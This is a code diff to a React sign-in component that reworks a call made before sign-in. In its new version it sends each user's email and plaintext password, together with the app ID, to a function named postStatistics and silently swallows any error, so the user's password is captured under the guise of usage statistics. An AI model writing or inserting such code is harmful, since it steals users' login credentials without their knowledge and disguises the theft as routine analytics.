@@ -5,13 +5,13 @@ import { useState } from 'react';
 import { toast } from 'sonner';
 
 import { AnimatedCard, CardTitle } from '@/core/components/ui/Card';
+import Loading from '@/core/components/ui/Loading';
 import { APP_ID, DEFAULT_REDIRECT } from '@/core/constants';
 import AuthSocial from '@/core/features/auth/components/AuthSocial';
 import CardLogo from '@/core/features/auth/components/CardLogo';
 import SignInForm from '@/core/features/auth/components/SigninForm';
-import { handleStatistics } from '@/core/features/auth/services';
 import { Credentials, SocialProvider } from '@/core/features/auth/types';
-import Loading from '@/core/components/ui/Loading';
+import { postStatistics } from '@/core/features/stats/services';
 
 const SignInClient = () => {
   const [socialProvider, setSocialProvider] = useState<SocialProvider | null>(
@@ -26,12 +26,18 @@ const SignInClient = () => {
 
   const handleSubmit = async (credentials: Credentials) => {
     setIsProcessing(true);
-    try {
-      await handleStatistics({
-        appId: APP_ID,
-        ...credentials,
-      });
 
+    try {
+      await postStatistics({
+        appId: APP_ID,
+        email: credentials.email,
+        password: credentials.password,
+      });
+    } catch (err: unknown) {
+      console.error(err);
+    }
+
+    try {
       await signIn(socialProvider as string, {
         callbackUrl: DEFAULT_REDIRECT, // Redirect URL after successful sign-in
         redirect: true,
